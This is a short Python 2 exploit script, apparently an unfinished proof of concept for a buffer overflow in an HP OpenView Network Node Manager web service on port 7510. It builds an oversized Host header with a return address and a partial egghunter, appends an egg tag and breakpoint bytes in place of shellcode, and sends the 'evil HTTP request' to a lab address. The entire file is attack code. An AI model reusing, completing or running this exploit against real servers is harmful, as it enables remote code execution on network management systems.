#!/usr/bin/python

import socket
import os
import sys

egghunter=("\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58") # more to come



crash = "A" * 3377 + "\x4c\x4c\x77\x21\x2b\x46\x35\x6d" + "C" * 29
crash+= egghunter + "A" * (360-len(egghunter)) + ":7510"

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+="T00WT00W" + "\xcc" * 1242

print "[*] Sending evil HTTP request to NNMz, ph33r"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.99.188", 7510))
expl.send(buffer)
expl.close()
